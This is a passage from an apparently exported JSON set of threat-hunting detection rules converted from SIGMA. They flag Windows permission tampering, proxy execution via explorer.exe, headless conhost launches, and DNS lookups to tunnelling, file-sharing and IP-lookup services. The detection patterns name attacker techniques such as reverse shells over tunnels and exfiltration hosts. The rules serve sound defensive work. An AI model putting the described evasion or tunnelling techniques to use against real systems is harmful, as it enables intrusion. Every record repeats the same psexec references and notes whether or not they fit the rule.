            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((((tgt.process.image.path contains \"\\cacls.exe\" or tgt.process.image.path contains \"\\icacls.exe\" or tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\") and (tgt.process.cmdline contains \"/grant\" or tgt.process.cmdline contains \"/setowner\" or tgt.process.cmdline contains \"/inheritance:r\")) or (tgt.process.image.path contains \"\\attrib.exe\" and tgt.process.cmdline contains \"-r\") or tgt.process.image.path contains \"\\takeown.exe\") and (not (tgt.process.cmdline contains \"ICACLS C:\\ProgramData\\dynatrace\\gateway\\config\\connectivity.history /reset\" or (tgt.process.cmdline contains \"ICACLS C:\\ProgramData\\dynatrace\\gateway\\config\\config.properties /grant :r \" and tgt.process.cmdline contains \"S-1-5-19:F\") or (tgt.process.cmdline contains \"\\AppData\\Local\\Programs\\Microsoft VS Code\" or tgt.process.cmdline contains \":\\Program Files\\Microsoft VS Code\") or (tgt.process.cmdline contains \":\\Program Files (x86)\\Avira\" or tgt.process.cmdline contains \":\\Program Files\\Avira\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 88
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the creation of a child \"explorer.exe\" process from a shell like process such as \"cmd.exe\" or \"powershell.exe\".\nAttackers can use \"explorer.exe\" for evading defense mechanisms by proxying the execution through the latter.\nWhile this is often a legitimate action, this rule can be use to hunt for anomalies.\nMuddy Waters threat actor was seeing using this technique.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Potential Proxy Execution Via Explorer.EXE From Shell Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\cmd.exe\" or src.process.image.path contains \"\\powershell.exe\" or src.process.image.path contains \"\\pwsh.exe\") and tgt.process.image.path contains \"\\explorer.exe\" and tgt.process.cmdline contains \"explorer.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 89
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the launch of a child process via \"conhost.exe\" with the \"--headless\" flag.\nThe \"--headless\" flag hides the windows from the user upon execution.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1059"
            ],
            "name": "Headless Process Launched Via Conhost.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\conhost.exe\" and src.process.cmdline contains \"--headless\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 90
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects DNS query requests to Visual Studio Code tunnel domains. Attackers can abuse that feature to establish a reverse shell or persistence on a machine.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1071"
            ],
            "name": "DNS Query To Visual Studio Code Tunnels Domain",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"DNS\" and (endpoint.os=\"windows\" and event.dns.request contains \".tunnels.api.visualstudio.com\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 91
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects DNS server discovery via LDAP query requests from uncommon applications",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1482"
            ],
            "name": "DNS Server Discovery Via LDAP Query",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"DNS\" and (endpoint.os=\"windows\" and (event.dns.request contains \"_ldap.\" and (not ((src.process.image.path contains \":\\Program Files\\\" or src.process.image.path contains \":\\Program Files (x86)\\\" or src.process.image.path contains \":\\Windows\\\") or (src.process.image.path contains \":\\ProgramData\\Microsoft\\Windows Defender\\Platform\\\" and src.process.image.path contains \"\\MsMpEng.exe\") or src.process.image.path=\"<unknown process>\" or not (src.process.image.path matches \"\\.*\"))) and (not (src.process.image.path contains \"C:\\WindowsAzure\\GuestAgent\" or (src.process.image.path contains \"\\chrome.exe\" or src.process.image.path contains \"\\firefox.exe\" or src.process.image.path contains \"\\opera.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 92
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects DNS queries made by \"AppInstaller.EXE\". The AppInstaller is the default handler for the \"ms-appinstaller\" URI. It attempts to load/install a package from the referenced URL\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "AppX Package Installation Attempts Via AppInstaller.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"DNS\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_\" and src.process.image.path contains \"\\AppInstaller.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 93
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Azure Hybrid Connection Manager services querying the Azure service bus service",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1554"
            ],
            "name": "DNS HybridConnectionManager Service Bus",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"DNS\" and (endpoint.os=\"windows\" and (event.dns.request contains \"servicebus.windows.net\" and src.process.image.path contains \"HybridConnectionManager\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 94
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects DNS queries initiated by \"Regsvr32.exe\"",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1559",
                "t1218"
            ],
            "name": "DNS Query Request By Regsvr32.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"DNS\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\regsvr32.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 95
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects DNS queries initiated by \"QuickAssist.exe\" to Microsoft Quick Assist primary endpoint that is used to establish a session.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1071",
                "t1210"
            ],
            "name": "DNS Query Request By QuickAssist.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"DNS\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\QuickAssist.exe\" and event.dns.request contains \"remoteassistance.support.services.microsoft.com\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 96
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects DNS queries for subdomains related to MEGA sharing website",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1567"
            ],
            "name": "DNS Query To MEGA Hosting Website",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"DNS\" and (endpoint.os=\"windows\" and event.dns.request contains \"userstorage.mega.co.nz\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 97
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects DNS queries for IP lookup services such as \"api.ipify.org\" originating from a non browser process.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1590"
            ],
            "name": "Suspicious DNS Query for IP Lookup Service APIs",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"DNS\" and (endpoint.os=\"windows\" and (((event.dns.request in (\"www.ip.cn\",\"l2.io\")) or (event.dns.request contains \"api.2ip.ua\" or event.dns.request contains \"api.bigdatacloud.net\" or event.dns.request contains \"api.ipify.org\" or event.dns.request contains \"bot.whatismyipaddress.com\" or event.dns.request contains \"canireachthe.net\" or event.dns.request contains \"checkip.amazonaws.com\" or event.dns.request contains \"checkip.dyndns.org\" or event.dns.request contains \"curlmyip.com\" or event.dns.request contains \"db-ip.com\" or event.dns.request contains \"edns.ip-api.com\" or event.dns.request contains \"eth0.me\" or event.dns.request contains \"freegeoip.app\" or event.dns.request contains \"geoipy.com\" or event.dns.request contains \"getip.pro\" or event.dns.request contains \"icanhazip.com\" or event.dns.request contains \"ident.me\" or event.dns.request contains \"ifconfig.io\" or event.dns.request contains \"ifconfig.me\" or event.dns.request contains \"ip-api.com\" or event.dns.request contains \"ip.360.cn\" or event.dns.request contains \"ip.anysrc.net\" or event.dns.request contains \"ip.taobao.com\" or event.dns.request contains \"ip.tyk.nu\" or event.dns.request contains \"ipaddressworld.com\" or event.dns.request contains \"ipapi.co\" or event.dns.request contains \"ipconfig.io\" or event.dns.request contains \"ipecho.net\" or event.dns.request contains \"ipinfo.io\" or event.dns.request contains \"ipip.net\" or event.dns.request contains \"ipof.in\" or event.dns.request contains \"ipv4.icanhazip.com\" or event.dns.request contains \"ipv4bot.whatismyipaddress.com\" or event.dns.request contains \"ipv6-test.com\" or event.dns.request contains \"ipwho.is\" or event.dns.request contains \"jsonip.com\" or event.dns.request contains \"myexternalip.com\" or event.dns.request contains \"seeip.org\" or event.dns.request contains \"wgetip.com\" or event.dns.request contains \"whatismyip.akamai.com\" or event.dns.request contains \"whois.pconline.com.cn\" or event.dns.request contains \"wtfismyip.com\")) and (not (src.process.image.path contains \"\\brave.exe\" or (src.process.image.path in (\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\",\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) or (src.process.image.path in (\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\",\"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\")) or (src.process.image.path in (\"C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\",\"C:\\Program Files\\Internet Explorer\\iexplore.exe\")) or src.process.image.path contains \"\\maxthon.exe\" or (src.process.image.path contains \"C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\\" or src.process.image.path contains \"\\WindowsApps\\MicrosoftEdge.exe\" or (src.process.image.path in (\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\",\"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe\"))) or ((src.process.image.path contains \"C:\\Program Files (x86)\\Microsoft\\EdgeCore\\\" or src.process.image.path contains \"C:\\Program Files\\Microsoft\\EdgeCore\\\") and (src.process.image.path contains \"\\msedge.exe\" or src.process.image.path contains \"\\msedgewebview2.exe\")) or src.process.image.path contains \"\\opera.exe\" or src.process.image.path contains \"\\safari.exe\" or src.process.image.path contains \"\\seamonkey.exe\" or src.process.image.path contains \"\\vivaldi.exe\" or src.process.image.path contains \"\\whale.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 98
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects DNS queries to a TeamViewer domain only resolved by a TeamViewer client by an image that isn't named TeamViewer (sometimes used by threat actors for obfuscation)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "TeamViewer Domain Query By Non-TeamViewer Application",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"DNS\" and (endpoint.os=\"windows\" and ((event.dns.request in (\"taf.teamviewer.com\",\"udp.ping.teamviewer.com\")) and (not src.process.image.path contains \"TeamViewer\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 99
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects DNS requests to Cloudflared tunnels domains.\nAttackers can abuse that feature to establish a reverse shell or persistence on a machine.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1071"
            ],
            "name": "Cloudflared Tunnels Related DNS Requests",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"DNS\" and (endpoint.os=\"windows\" and (event.dns.request contains \".v2.argotunnel.com\" or event.dns.request contains \"protocol-v2.argotunnel.com\" or event.dns.request contains \"trycloudflare.com\" or event.dns.request contains \"update.argotunnel.com\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 100
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a DNS query by a non browser process on the system to \"azurewebsites.net\". The latter was often used by threat actors as a malware hosting and exfiltration site.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "DNS Query To AzureWebsites.NET By Non-Browser Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"DNS\" and (endpoint.os=\"windows\" and (event.dns.request contains \"azurewebsites.net\" and (not ((src.process.image.path in (\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\",\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) or (src.process.image.path in (\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\",\"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\")) or (src.process.image.path in (\"C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\",\"C:\\Program Files\\Internet Explorer\\iexplore.exe\")) or (src.process.image.path contains \"C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\\" or src.process.image.path contains \"\\WindowsApps\\MicrosoftEdge.exe\" or (src.process.image.path in (\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\",\"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe\"))) or ((src.process.image.path contains \"C:\\Program Files (x86)\\Microsoft\\EdgeCore\\\" or src.process.image.path contains \"C:\\Program Files\\Microsoft\\EdgeCore\\\") and (src.process.image.path contains \"\\msedge.exe\" or src.process.image.path contains \"\\msedgewebview2.exe\")) or src.process.image.path contains \"\\safari.exe\" or (src.process.image.path contains \"\\MsMpEng.exe\" or src.process.image.path contains \"\\MsSense.exe\") or (src.process.image.path contains \"\\brave.exe\" and src.process.image.path contains \"C:\\Program Files\\BraveSoftware\\\") or (src.process.image.path contains \"\\AppData\\Local\\Maxthon\\\" and src.process.image.path contains \"\\maxthon.exe\") or (src.process.image.path contains \"\\AppData\\Local\\Programs\\Opera\\\" and src.process.image.path contains \"\\opera.exe\") or ((src.process.image.path contains \"C:\\Program Files\\SeaMonkey\\\" or src.process.image.path contains \"C:\\Program Files (x86)\\SeaMonkey\\\") and src.process.image.path contains \"\\seamonkey.exe\") or (src.process.image.path contains \"\\AppData\\Local\\Vivaldi\\\" and src.process.image.path contains \"\\vivaldi.exe\") or ((src.process.image.path contains \"C:\\Program Files\\Naver\\Naver Whale\\\" or src.process.image.path contains \"C:\\Program Files (x86)\\Naver\\Naver Whale\\\") and src.process.image.path contains \"\\whale.exe\") or src.process.image.path contains \"\\Tor Browser\\\" or ((src.process.image.path contains \"C:\\Program Files\\Waterfox\\\" or src.process.image.path contains \"C:\\Program Files (x86)\\Waterfox\\\") and src.process.image.path contains \"\\Waterfox.exe\") or (src.process.image.path contains \"\\AppData\\Local\\Programs\\midori-ng\\\" and src.process.image.path contains \"\\Midori Next Generation.exe\") or ((src.process.image.path contains \"C:\\Program Files\\SlimBrowser\\\" or src.process.image.path contains \"C:\\Program Files (x86)\\SlimBrowser\\\") and src.process.image.path contains \"\\slimbrowser.exe\") or (src.process.image.path contains \"\\AppData\\Local\\Flock\\\" and src.process.image.path contains \"\\Flock.exe\") or (src.process.image.path contains \"\\AppData\\Local\\Phoebe\\\" and src.process.image.path contains \"\\Phoebe.exe\") or ((src.process.image.path contains \"C:\\Program Files\\Falkon\\\" or src.process.image.path contains \"C:\\Program Files (x86)\\Falkon\\\") and src.process.image.path contains \"\\falkon.exe\") or ((src.process.image.path contains \"C:\\Program Files (x86)\\Avant Browser\\\" or src.process.image.path contains \"C:\\Program Files\\Avant Browser\\\") and src.process.image.path contains \"\\avant.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 101
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects DNS query requests to Devtunnels domains. Attackers can abuse that feature to establish a reverse shell or persistence on a machine.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1071"
            ],
            "name": "DNS Query To Devtunnels Domain",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"DNS\" and (endpoint.os=\"windows\" and event.dns.request contains \".devtunnels.ms\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 102
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
